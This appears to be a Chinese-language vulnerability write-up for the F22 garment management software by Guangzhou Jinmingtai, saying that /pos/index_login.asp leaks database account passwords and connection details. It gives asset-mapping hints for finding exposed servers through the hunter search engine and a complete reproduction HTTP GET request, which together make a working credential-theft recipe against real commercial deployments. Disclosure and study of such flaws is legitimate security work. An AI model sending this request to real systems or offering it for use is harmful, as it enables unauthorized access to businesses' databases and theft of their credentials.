# 广州锦铭泰软件科技有限公司F22服装管理软件系统index_login.asp存在信息泄漏漏洞

# 一、漏洞简介
广州锦铭泰软件科技有限公司，是一家专业为品牌服饰鞋包企业提供信息化解决方案的高科技企业，该公司开发的F22服装管理软件系统存在信息泄漏漏洞，攻击者最终可利用该漏洞获取数据库账号密码等连接信息。

# 二、影响版本
+ F22服装管理软件系统

# 三、资产测绘
+ hunter
+ 特征

![1701097856863-836b585b-5ad5-4a30-9d15-de84e9bb5567.png](./img/MHECYITamkoAwlWR/1701097856863-836b585b-5ad5-4a30-9d15-de84e9bb5567-922677.png)

# 四、漏洞复现
```java
GET /pos/index_login.asp HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![1702014624209-0f6319f6-e292-4c9c-a571-8600d6f09242.png](./img/MHECYITamkoAwlWR/1702014624209-0f6319f6-e292-4c9c-a571-8600d6f09242-352619.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ols3csnzkgnc69fn>